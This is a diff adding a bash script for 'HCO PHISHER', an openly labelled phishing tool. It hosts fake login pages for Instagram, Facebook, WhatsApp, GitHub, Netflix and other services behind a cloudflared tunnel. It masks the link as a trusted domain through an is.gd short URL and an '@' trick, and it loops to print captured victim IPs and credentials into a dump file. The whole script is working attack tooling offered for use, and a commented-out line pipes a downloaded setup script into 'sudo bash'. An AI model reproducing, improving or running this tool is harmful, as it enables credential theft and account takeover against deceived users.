@@ -1,0 +1,378 @@
+#!/bin/bash
+###################################
+#Author  : Mr. Derek              #
+#Project : HCO PHISHER            #
+#Type    : Phishing Tool          #
+#lang    : Shell Script           #
+#Owner   : Azhar YT, Miss Praveen #
+###################################
+
+
+#################################
+#          C O L O U R S        #
+#################################
+orange='\033[0;33m'             #
+white="\033[1;37m"              #
+grey="\033[0;37m"               #
+purple="\033[1;35m"             #
+red="\033[1;31m"                #
+green="\033[1;32m"              #
+yellow="\033[1;33m"             #
+purple="\033[0;35m"             #
+cyan="\033[0;36m"               #
+cyan1="\033[1;36m"              #
+sta="\e[5m"                     #
+cafe="\033[0;33m"               #
+fiuscha="\033[0;35m"            #
+sto="\e[25m"                    #
+blue="\033[1;34m"               #
+l_red="\033[1;37;41m"           #
+nc="\033[0m"                    # 
+pink="\e[95m"                   #
+#################################
+
+# Script Starting
+msg() {
+	printf "${green}[${nc}+${green}] ${white}${1}\n${nc}"
+}
+errormsg () {
+        printf "${red}[!] ${white}${1}\n${nc}"
+}
+function check_root() {
+        if [ "$(whoami &2>/dev/null)" != "root" ] && [ "$(id -un &2>/dev/null)" != "root" ];then
+                echo ""
+                echo ""
+                errormsg "Admin user detected\n"
+                errormsg "Use 'sudo !!'\n"
+                exit 1
+	fi
+}
+
+function os() {
+	cat /etc/os-release &> /dev/null 2>&1
+	if [ "$?" -eq "0" ]; then
+		OS=DEBIAN 
+		BIN="/usr/bin"
+		file="/usr/share/HCO-Phish"
+		EXP="$HOME/Desktop"
+                check_root	
+	else
+		OS=TERMUX
+		BIN="${PREFIX}/bin"
+		file="${PREFIX}/share/HCO-Phish"
+		EXP="/sdcard"
+	fi
+}
+update() {
+	clear
+	banner
+	msg "please clone or update it manully\n\n"
+	exit 1
+
+#	if [[ $OS == DEBIAN ]]; then
+		#git clone https://github.com/<null>/<null>
+#		sudo wget -qO- https://github.com/<null>/<null>/raw/master/setup | sudo bash
+#	else
+		#git clone https://github.com/<null>/<null>
+#		wget -qO- https://github.com/<null>/<null>/raw/master/setup | bash
+#	fi
+}
+check () {
+	if [ ! "${1//:*}" = http ]; then
+        if [ ! "${1//:*}" = https ]; then
+            echo -e "\e[31m[!] Invalid URL. Please use http:// or https://.\e[0m \n"
+	    echo -e "\e[32m type hcophish to run tool again."
+	    sleep 1
+	    exit 1
+        fi
+    fi
+}
+banner() {
+	printf "${green}
+
+          ▒█░▒█ ░ ▒█▀▀█ ░ ▒█▀▀▀█ 
+          ▒█▀▀█ ▄ ▒█░░░ ▄ ▒█░░▒█ 
+          ▒█░▒█ █ ▒█▄▄█ █ ▒█▄▄▄█ 
+
+   ▒█▀▀█ ▒█░▒█ ▀█▀ ▒█▀▀▀█ ▒█░▒█ ▒█▀▀▀ ▒█▀▀█ 
+   ▒█▄▄█ ▒█▀▀█ ▒█░ ░▀▀▀▄▄ ▒█▀▀█ ▒█▀▀▀ ▒█▄▄▀ 
+   ▒█░░░ ▒█░▒█ ▄█▄ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█░▒█\n                                            ${yellow}v1.0${green}\n"
+printf "${red}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
+printf "   ${yellow}.:H a c k e r  C o l o n y  O f f i c i a l:.\n"
+printf "${red}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" 
+printf "    ${cyan}A Basic Phishing Tool BY Hacker colony offcial\n\n\n"
+
+}
+check_internet() {
+	ping -c 1 google.com > /dev/null 2>&1
+	if [[ "$?" != 0 ]];then	
+		clear
+		errormsg "PLEASE CHECK YOUR INTERNET CONNECTION" 
+		exit 0
+	fi
+}
+cloudflareupd(){
+	clear
+	msg "Installing cloudflare ..."
+	cd $HOME
+	os;rm -rf ${BIN}/cloudflared && rm -rf ${file}/www/.cloud.log
+        if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
+                        cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
+                elif [[ "$arch" == *'aarch64'* ]]; then
+                        cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+                elif [[ "$arch" == *'x86_64'* ]]; then
+                        if [[ "$ArNam" == *'amd64'* ]]; then
+                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+                        else
+                                cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+                        fi
+                else
+                        cloudd="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
+        fi
+(wget --quiet ${cloudd} -O cloudflared)
+chmod +x cloudflared && mv cloudflared $BIN
+echo -e  "\e[0;32mDONE\n\n"
+MENU
+}
+
+LAST_STG() {
+	clear
+	banner
+	printf "${green} ORIGINAL LINK :- $cafe$black ${url}\n\n"
+	printf "${green} MODIFIED LINK :- $cafe$black ${mod} $green\n\n"
+	printf "${yellow}D   A   S   H      B    O    A    R   D\n\n"
+        while true; do
+		if [[ -e "ip.txt" ]]; then
+			cat ip.txt 
+			cat ip.txt  >> ${EXP}/dump.hco
+			rm -rf ip.txt
+		fi
+		if [[ -e "log.txt" ]]; then
+			cat log.txt
+			cat log.txt >> ${EXP}/dump.hco
+			rm -rf log.txt
+		fi
+	done
+}
+
+MID() {
+	echo
+	if [[ $value == 'false' ]]; then
+		read -p $'\e[1;32m\e[96m Enter your port eg.8080\e[1;91m : ' PORT
+		echo
+	else
+		echo
+	fi
+	msg "starting PHP server ...\n\n"
+	sleep 2
+if [[ -e ${BIN}/cloudflared ]]; then
+	msg "starting cloudflare server ...\n\n"
+	
+	if [[ -e ${file}/www/.cloud.log ]]; then
+		rm -rf ${file}/www/.cloud.log
+		touch ${file}/www/.cloud.log
+	else
+		touch ${file}/www/.cloud.log
+	fi
+	if [[ `command -v termux-chroot` || "$osnam" == "Android" ]]; then
+		php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; termux-chroot cloudflared tunnel --url "$HOST":"$PORT" --logfile ${file}/www/.cloud.log > /dev/null 2>&1 & sleep 5;
+	else
+		php -S "$HOST":"$PORT" > /dev/null 2>&1 & sleep 2; cloudflared tunnel --url "$HOST":"$PORT" --logfile ${file}/www/.cloud.log  > /dev/null 2>&1 & sleep 5;
+	fi
+	url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "${file}/www/.cloud.log")
+	msg "Initializing server..."
+	sleep 5
+	if [[ -z $url || $url == "" ]]; then
+		echo
+		errormsg "internal server - error, retry"
+		sleep 4
+		MENU
+	else
+		clear
+		banner
+		msg "server status online."
+		sleep 2
+	fi
+    echo	
+	echo -e  "\e[0;32mDONE\n\n"
+	sleep 3
+	askuri
+else
+        echo                                                                          
+	errormsg "Cloudflare is not installed\n\n"                     
+	sleep 3	
+	cloudflareupd                                                                               
+fi
+
+}
+function askuri() {
+	echo -e "${green} URL :- $url\n\n"
+	read -p $'\e[0;34mDo you want to modify URL?\e[0;31m(Y/N) : ' moduri
+	if [[ $moduri == "y" || $moduri == "Y" ]]; then
+	         url_short
+	elif [[ $moduri == "n" || $moduri == "N" ]]; then
+	       mod="You haven't modify URL"
+	       LAST_STG
+       else
+	       echo
+	       errormsg "❌Wrong Input❌\n\n"
+	       sleep 3
+	       clear
+	       askuri
+	       
+	fi
+}
+function url_short() {	
+msk=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${url})
+if [[ $msk == https://is.gd/[0-9a-zA-Z]* ]]; then
+	mask=${msk#https://}
+	read -p $'\n\033[1;92mHCO PHISHER\033[1;97m>> \033[1;37mMask Your url domain here \033[1;93m(Ex. https://google.com) : \e[0m' ngrl
+	check $ngrl
+	printf "\033[1;92mHCO PHISHER >> $yellow Enter your key words -: Ex. join-club-login\n"
+	printf "\033[1;92mHCO PHISHER >> $yellow Don't use space in your words\n"
+	read -p $'\e[1;92mHCO PHISHER\033[1;97m >> \e[1;37mEnter your words here :\e[0m ' stuff
+	mod="$ngrl-$stuff@$mask"
+	LAST_STG
+else
+	echo
+	mod="internal server - error"
+fi
+
+}
+
+function start() {
+    if [[ ! -e "log.txt" ]]; then
+    touch log.txt ip.txt
+    fi
+	HOST="127.0.0.1"
+	echo
+	read -p $'\e[1;32m\e[96m Do You want to enter port?\e[1;91m (Y/N): ' opt1
+	
+	if [[ $opt1 == "Y" || $opt1 == "y" ]]; then
+		value="false"
+		MID
+        elif [[ $opt1 == "N" || $opt1 == "n" ]]; then
+        	PORT="4444"
+		echo
+		msg "Your Default Port Is : $PORT"
+		sleep 3
+        	MID
+        else 
+        	echo
+        	errormsg "❌Wrong Input❌\n\n"
+        	sleep 3
+        	msg "Retrying to your option : $opt\n\n"
+        	sleep 3
+        	start
+
+        fi
+}
+
+
+
+MENU() {
+	clear
+	banner
+	printf "\e[0m\n"
+	printf " \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;32m Instagram \e[0m\n\n"
+	printf " \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;32m Facebook  \e[0m\n\n"
+	printf " \e[0m\e[1;91m[\e[0m\e[1;97m03\e[0m\e[1;91m]\e[0m\e[1;32m Snapchat  \e[0m\n\n"
+	printf " \e[0m\e[1;91m[\e[0m\e[1;97m04\e[0m\e[1;91m]\e[0m\e[1;32m Linkedin  \e[0m\n\n"
+	printf " \e[0m\e[1;91m[\e[0m\e[1;97m05\e[0m\e[1;91m]\e[0m\e[1;32m Whatsapp  \e[0m\n\n"
+	printf " \e[0m\e[1;91m[\e[0m\e[1;97m06\e[0m\e[1;91m]\e[0m\e[1;32m Telegram  \e[0m\n\n"
+	printf " \e[0m\e[1;91m[\e[0m\e[1;97m07\e[0m\e[1;91m]\e[0m\e[1;32m Netfilx   \e[0m\n\n"
+	printf " \e[0m\e[1;91m[\e[0m\e[1;97m08\e[0m\e[1;91m]\e[0m\e[1;32m Twitter   \e[0m\n\n"
+	printf " \e[0m\e[1;91m[\e[0m\e[1;97m09\e[0m\e[1;91m]\e[0m\e[1;32m Github    \e[0m\n\n"
+	printf " \e[0m\e[1;91m[\e[0m\e[1;97m10\e[0m\e[1;91m]\e[0m\e[1;32m Twitch    \e[0m\n\n"
+	printf " \e[0m\e[1;91m[\e[0m\e[1;97m00\e[0m\e[1;91m]\e[0m\e[1;32m <-Back     \e[0m\n\n"
+	read -p $'\e[0;32mH.C.O PHISHER :-> \e[0m' opt
+	
+	if [[ $opt == 1 || $opt == 01 ]]; then
+		cd ${file}/www/instagram
+		start
+	elif [[ $opt == 2 || $opt == 02 ]]; then
+		cd ${file}/www/facebook
+		start
+	elif [[ $opt == 3 || $opt == 03 ]]; then
+		cd ${file}/www/snapchat
+		start
+	elif [[ $opt == 4 || $opt == 04 ]]; then
+		cd ${file}/www/Linkedin
+		start
+	elif [[ $opt == 5 || $opt == 05 ]]; then
+		cd ${file}/www/wa-me
+		start
+	elif [[ $opt == 6 || $opt == 06 ]]; then
+		cd ${file}/www/telegram
+		start
+	elif [[ $opt == 7 || $opt == 07 ]]; then
+		cd ${file}/www/Netfilx
+		start
+        elif [[ $opt == 8 || $opt == 08 ]]; then
+		cd ${wdir}/twitter
+		start
+	elif [[ $opt == 9 || $opt == 09 ]]; then
+		cd ${file}/www/github
+		start
+	elif [[ $opt == 10 || $opt == 10 ]]; then
+		cd ${file}/www/twitch
+		start
+	elif [[ $opt == 00 || $opt == 0 ]]; then
+		MAIN
+	fi
+
+
+}
+
+aboutmsg(){
+	if [ $OS == TERMUX ]; then
+		am start -a android.intent.action.VIEW -d https://www.youtube.com/channel/UCXnBZRpLD7QzcJsUKBF-cKw
+		sleep 8
+		am start -a android.intent.action.VIEW -d https://www.instagram.com/hackers_colony_official
+		MAIN
+	else 
+		xdg-open https://www.youtube.com/channel/UCXnBZRpLD7QzcJsUKBF-cKw  
+		sleep 5	
+		MAIN
+	
+	fi
+}
+function MAIN() {
+clear
+banner
+	printf "           ${l_red}[${nc}01${l_red}]${nc} ${cyan1} -:- Start Phishing\n\n"
+	printf "           ${l_red}[${nc}02${l_red}]${nc} ${cyan1} -:- Update Tool\n\n"
+	printf "           ${l_red}[${nc}03${l_red}]${nc} ${cyan1} -:- ABOUT\n\n"
+	printf "           ${l_red}[${nc}99${l_red}]${nc} ${cyan1} -:- Exit\n\n"
+	read -p $'\e[0;32mH.C.O PHISHER :-> \e[0m' option
+	
+	if [[ $option == 1 || $option == 01 ]]; then
+		MENU
+	elif [[ $option == 2 || $option == 02 ]]; then
+		update
+	elif [[ $option == 3 || $option == 03 ]]; then
+		aboutmsg
+	elif [[ $option == 99 ]]; then
+		clear
+		banner
+		msg "Thanks For Using this Tool\n\n"
+		sleep 2
+		msg "Please Subscribe MY channel Hackers colony official\n\n"
+		sleep 4
+		xdg-open https://www.youtube.com/channel/UCXnBZRpLD7QzcJsUKBF-cKw
+		exit 1
+	else
+		echo
+		printf $red"❌Wrong Input❌"
+		sleep 1.5
+		hcophish
+	fi
+
+}
+killall -KILL php cloudflared &>/dev/null
+os
+check_internet
+arch=`uname -m`
+osnam=$(uname -o)
+ArNam=$(dpkg --print-architecture)
+MAIN
